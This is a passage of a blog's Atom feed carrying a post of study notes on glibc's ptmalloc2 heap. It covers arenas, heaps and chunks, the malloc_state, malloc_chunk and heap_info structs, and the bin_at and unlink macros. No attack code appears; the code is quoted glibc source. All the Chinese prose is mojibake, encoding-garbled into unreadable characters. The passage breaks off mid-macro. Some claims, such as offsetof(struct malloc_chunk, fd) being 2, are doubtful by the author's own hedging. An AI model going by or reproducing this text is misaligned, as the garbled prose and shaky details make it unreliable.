    <category term="æ‚çƒ©" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="åŸºç¡€" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>å †å­¦ä¹ ç¬”è®°</title>
    <link href="https://ixout.github.io/posts/8932/"/>
    <id>https://ixout.github.io/posts/8932/</id>
    <published>2023-03-02T14:31:03.000Z</published>
    <updated>2023-03-18T13:18:29.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å †çš„å­¦ä¹ å¯ä»¥è¯´æ˜¯ä¸€é“åäº†ï¼Œè¦æŒæ¡çš„è¯å¯¹æºç é˜…è¯»åŠç†è§£çš„èƒ½åŠ›è¦æ±‚æŒºé«˜ï¼Œåˆå­¦æ—¶å¾€å¾€è¢«æå¾—æ™•å¤´è½¬å‘ï¼Œè¿™é‡Œå°±è®°å½•ä¸€ä¸‹æˆ‘çš„å­¦ä¹ è®°å½•ï¼ŒåŸºç¡€çš„ä¸œè¥¿åˆ°å¤„éƒ½æœ‰å°±ä¸è®°äº†ï¼Œä¸»è¦è¿˜æ˜¯è®°ä¸€äº›æˆ‘è®¤ä¸ºæ¯”è¾ƒé‡è¦æˆ–è€…å®¹æ˜“è¢«å¿½ç•¥çš„ç»†èŠ‚ã€‚</p><hr><h1 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>åŸºç¡€çš„ä¸œè¥¿ç½‘ä¸Šèƒ½æœåˆ°çš„æ•™ç¨‹(åƒctfwiki,ç‹¼ç»„å®‰å…¨,ctf-all-in-oneç­‰)è®²çš„å·²ç»å¾ˆç»†äº†ï¼Œè®¤çœŸçœ‹ä¸€å®šèƒ½æœ‰ä¸€ä¸ªåŸºç¡€çš„çŸ¥è¯†æ¡†æ¶.ä¸è¿‡è¿˜æ˜¯æ¨èçœ‹ä¸€çœ‹ååº­å¤§ä½¬çš„<a href="https://pan.baidu.com/s/167Z3CHDEeP1dl3c2Ii0lXg?pwd=1234">glibcå†…å­˜ç®¡ç†-ptmalloc2æºç åˆ†æ</a>(å¾ˆç»†å¾ˆå…¨å¾ˆç›´ç™½),çœ‹äº†ä¹‹åçœŸçš„èƒ½æœ‰å¾ˆå¤šæ”¶è·.</p><h2 id="ç†æ¸…ä»å±å…³ç³»"><a href="#ç†æ¸…ä»å±å…³ç³»" class="headerlink" title="ç†æ¸…ä»å±å…³ç³»"></a>ç†æ¸…ä»å±å…³ç³»</h2><p>åˆå­¦æ—¶,heap,arena,chunkè¿™äº›ä¸œè¥¿å¾ˆå®¹æ˜“æŠŠäººæç³Šæ¶‚,è¿™é‡Œç®€å•æ¢³ç†ä¸€ä¸‹</p><p>ç³»ç»Ÿä¸­æ•´ä¸ªå †åŠŸèƒ½çš„å®ç°åŒºåŸŸéƒ½å¯ä»¥è¢«å«åšå †(heap),ä½†å…¶å®ä½†heapè¿˜æœ‰ä¸€ä¸ªç›¸å¯¹è¿™ä¸ªæ•´ä¸ªå †åŒºåŸŸè¦æ›´å°çš„æ¦‚å¿µ,å¦‚ä¸‹:</p><p>glibcçš„mallocæºç ä¸­æ¶‰åŠä¸‰ç§æœ€é‡è¦æ•°æ®ç»“æ„ï¼š<strong>Arenaã€Heapã€Chunk</strong> ï¼Œåˆ†åˆ«å¯¹åº”ç»“æ„ä½“<strong>malloc_stateã€heap_infoã€malloc_chunk ã€‚</strong>æ¯ä¸ªæ•°æ®ç»“æ„éƒ½æœ‰å¯¹åº”çš„ç»“æ„ä½“å®ç°,å¦‚å›¾:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095156.png" alt=""></p><ul><li><strong>Thread - Arena</strong> ï¼š ä¸€ä¸ªArenaå¯¹åº”å¤šä¸ªçº¿ç¨‹Threadã€‚å³æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªArenaï¼Œä½†æ˜¯æœ‰å¯èƒ½å¤šä¸ªçº¿ç¨‹å…±ç”¨ä¸€ä¸ªArena(åŒä¸€æ—¶é—´åªèƒ½ä¸€å¯¹ä¸€)ã€‚æ¯ä¸ªArenaéƒ½åŒ…å«ä¸€ä¸ªmalloc_stateç»“æ„ä½“ï¼Œä¿å­˜bins, top chunk, Last reminder chunkç­‰ä¿¡æ¯ã€‚</li><li><strong>Arena - Heap</strong>ï¼šä¸€ä¸ªArenaå¯èƒ½æ‹¥æœ‰å¤šä¸ªheapã€‚Arenaå¼€å§‹çš„æ—¶å€™åªæœ‰ä¸€ä¸ªheapï¼Œä½†æ˜¯å½“è¿™ä¸ªheapçš„ç©ºé—´ç”¨å°½æ—¶ï¼Œå°±éœ€è¦è·å–æ–°çš„heapã€‚(ä¹Ÿå¯ä»¥ç†è§£ä¸ºsubheapå­å †)</li><li><strong>Heap - Chunk</strong>ï¼šä¸€ä¸ªHeapæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚ä¼šåˆ’åˆ†ä¸ºå¤šä¸ªchunkï¼Œæ¯ä¸ªchunkæ‹¥æœ‰è‡ªå·±çš„header - malloc_chunkã€‚</li></ul><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161600.png" alt=""></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<em>Main Arenaåªæœ‰ä¸€ä¸ªheapï¼Œå› æ­¤æ²¡æœ‰heap_infoç»“æ„</em>ã€‚å½“main arenaç”¨å°½ç©ºé—´åï¼Œä¼šæ‰©å±•å½“å‰çš„heapç©ºé—´ã€‚æ­¤å¤–ï¼ŒMain Areançš„Arena headerå¹¶ä¸æ˜¯heap segmentçš„ä¸€éƒ¨åˆ†ï¼Œè€Œä½œä¸ºå…¨å±€å˜é‡å‚¨å­˜åœ¨libc.soçš„æ•°æ®æ®µä¸­ã€‚</p><p>ä¸‹å›¾æ˜¯åªæœ‰ä¸€ä¸ªheapæ—¶ï¼Œä¸»çº¿ç¨‹å’Œçº¿ç¨‹çš„å †ç»“æ„ç¤ºæ„å›¾ï¼Œå·¦å›¾æ˜¯Main Arenaï¼Œå³å›¾æ˜¯Threa Arenaã€‚å †æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å¢é•¿çš„ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªmalloc_chunkä¸Šé¢éƒ½è·Ÿç€ä¸€ä¸ªchunkã€‚åŒæ—¶Main Arenaæ²¡æœ‰heap_infoå’Œmalloc_stateçš„ç»“æ„ã€‚ </p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095630.png" alt=""></p><p>ä¸‹å›¾æ˜¯å­˜åœ¨å¤šä¸ªheapçš„thread Arenaçš„æƒ…å†µã€‚å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªheapéƒ½ä¸€ä¸ªheap headerï¼ˆheap_infoï¼‰ï¼Œä½†æ˜¯åªæœ‰æœ€åˆçš„heapæ‹¥æœ‰arena header(malloc_state).</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095644.png" alt="graph"></p><p>å½“çº¿ç¨‹ç”³è¯·å†…å­˜æ—¶ï¼Œå°±åˆ›å»ºä¸€ä¸ªArenaã€‚ä¸»çº¿ç¨‹æœ‰è‡ªå·±ç‹¬ç«‹çš„Arenaï¼Œå«åšmain arenaï¼Œä½†ä¸æ˜¯æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„Arenaã€‚</p><p>Arenaçš„ä¸ªæ•°å–å†³äºcpuæ ¸çš„ä¸ªæ•°</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_204838.png" alt=""></p><h2 id="ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰"><a href="#ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰" class="headerlink" title="ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰"></a>ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="mallocå’Œfreeçš„æµç¨‹"><a href="#mallocå’Œfreeçš„æµç¨‹" class="headerlink" title="mallocå’Œfreeçš„æµç¨‹"></a>mallocå’Œfreeçš„æµç¨‹</h2><h3 id="mallocæµç¨‹"><a href="#mallocæµç¨‹" class="headerlink" title="mallocæµç¨‹"></a>mallocæµç¨‹</h3><hr><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338164.png" alt="malloc"></p><h3 id="freeæµç¨‹"><a href="#freeæµç¨‹" class="headerlink" title="freeæµç¨‹"></a>freeæµç¨‹</h3><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338155.png" alt="free"></p><h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><h3 id="binsæ•°ç»„ç›¸å…³"><a href="#binsæ•°ç»„ç›¸å…³" class="headerlink" title="binsæ•°ç»„ç›¸å…³"></a>binsæ•°ç»„ç›¸å…³</h3><p>binsæ•°ç»„å­˜åœ¨äºmalloc_stateç»“æ„ä½“ä¸­,å®ƒè¢«å®šä¹‰ä¸ºä¸€ä¸ªé•¿åº¦ä¸º254çš„æ•°ç»„,ä½†æˆ‘ä»¬éƒ½çŸ¥é“çœŸæ­£åªæœ‰126ä¸ªbin,åŠæœ‰æ•ˆä¸‹æ ‡ä¸º[0,251] (å¤šçš„é‚£ä¸¤ä¸ªè¢«æµªè´¹äº†)ã€‚</p><p>æ¯ä¸ªbinséƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆ,åœ¨ä¸²è”binä¸­èµ·åˆ°äº†é‡è¦ä½œç”¨,åŒä¸€ä¸ªbinçš„fdæŒ‡é’ˆå’ŒbkæŒ‡é’ˆè¢«å­˜å‚¨åœ¨ç›¸é‚»ä½ç½®(ä¾‹å¦‚bins[0]ä¸ºunsortedbinçš„fdæŒ‡é’ˆbins[1]ä¸ºunsortedbinçš„bkæŒ‡é’ˆ)ã€‚</p><p>ä½†å…¶å®åœ¨è®²è§£è¿‡ç¨‹ä¸­æˆ‘ä»¬æ›´å¤šæåŠçš„æ˜¯binçš„ä¸‹æ ‡,å®é™…ä¸Šbinæ•°ç»„æ˜¯ä¸€ä¸ªæ›´æŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒå®é™…<strong>å¹¶ä¸å­˜åœ¨</strong>,ä½†ä½¿ç”¨binæ•°ç»„ä¸‹æ ‡ä¸å¯¹åº”å„ä¸ªbinçš„å…³ç³»æ›´ä¸ºç›´æ¥ï¼Œå› æ­¤è¢«æ›´å¤šçš„ä½¿ç”¨ã€‚</p><p>binsä¸‹æ ‡[X]ä¸binä¸‹æ ‡[Y]çš„å…³ç³»ä¸º:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_203928.png" alt=""></p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè®¸å¤šæ•™ç¨‹ä¼šè¯´bin[0]å’Œbin[127]ä¸å­˜åœ¨äº†,å› ä¸ºå¦‚æœè¿™æ ·çš„è¯å¯¹åº”çš„binsä¸‹æ ‡å°±ä¸º-2å’Œ252,æ˜æ˜¾å‡ºé”™äº†ã€‚</p><p><strong>ä»¥ä¸Šæ‰€è¿°å…¶å®æˆ‘ä¹Ÿä¸æ˜¯å¾ˆç¡®å®šï¼Œå„ç§æ•™ç¨‹é‡Œé¢çš„è¦ä¹ˆè¯­ç„‰ä¸è¯¦æ²¡å¤´æ²¡å°¾ï¼Œè¦ä¹ˆä¸Šä¸‹çŸ›ç›¾ï¼Œæˆ‘ä¹Ÿåªèƒ½æ ¹æ®æºç ä»¥åŠä¸€äº›æ¯”è¾ƒé è°±çš„åšå®¢åšå‡ºä¸€ç§æ¯”è¾ƒåˆç†çš„è§£é‡Š</strong></p><p>æˆ‘ä¸»è¦ä»¥è¿™ä¸¤ä¸ªå®ä¸ºæ ¹æ®,ç‰¹åˆ«æ˜¯ç¬¬äºŒä¸ªå®ä¸æˆ‘ä¸Šé¢çš„å…¬å¼å¯¹ä¸Šäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION) ##è¿™ä¸ªåªæ˜¯smallbinçš„ç´¢å¼•è®¡ç®—æ–¹å¼,ä½†å…¶ä»–binå¤§å·®ä¸å·®</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><h2 id="é‡è¦å®è§£é‡Š"><a href="#é‡è¦å®è§£é‡Š" class="headerlink" title="é‡è¦å®è§£é‡Š"></a>é‡è¦å®è§£é‡Š</h2><p>çœ‹æºç æœ€è®©äººå¤´å¤§çš„æ— éå„ç§å®äº†(å»ºè®®åœ¨vscodeä¸­é˜…è¯»æºç ,èƒ½ç›´æ¥æ‰¾åˆ°å£°æ˜å¤„ã€‚)è¿™é‡Œè®°å‡ ä¸ªé‡è¦çš„å®,é¡ºä¾¿åšç‚¹è§£é‡Šã€‚</p><h3 id="bin-at-m-i"><a href="#bin-at-m-i" class="headerlink" title="bin_at(m,i)"></a>bin_at(m,i)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­offsetof (struct malloc_chunk, fd))æ˜¯å¸¸æ•°<strong>å€¼ä¸º2</strong>,æ‰€éœ€binçš„è¡¨å¤´ä¸å‰ä¸¤ä¸ªbinsæ•°ç»„å…ƒç´ è¢«è§†ä¸ºäº†ä¸€ä¸ªmalloc_chunk,ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆçš„ç»“æœå°±æ˜¯æŒ‡å‘è¿™ä¸ªchunkçš„æŒ‡é’ˆã€‚</p><h3 id="first-b-ä¸last-b"><a href="#first-b-ä¸last-b" class="headerlink" title="first(b)ä¸last(b)"></a>first(b)ä¸last(b)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>é‡Œé¢çš„bä¸€èˆ¬å°±æ˜¯bin_atçš„è¿”å›ç»“æœ,äºæ˜¯åˆšå¥½æŒ‡å‘æ‰€éœ€binçš„å¤´å’Œå°¾ã€‚</p><h3 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title="unlink(AV, P, BK, FD)"></a>unlink(AV, P, BK, FD)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 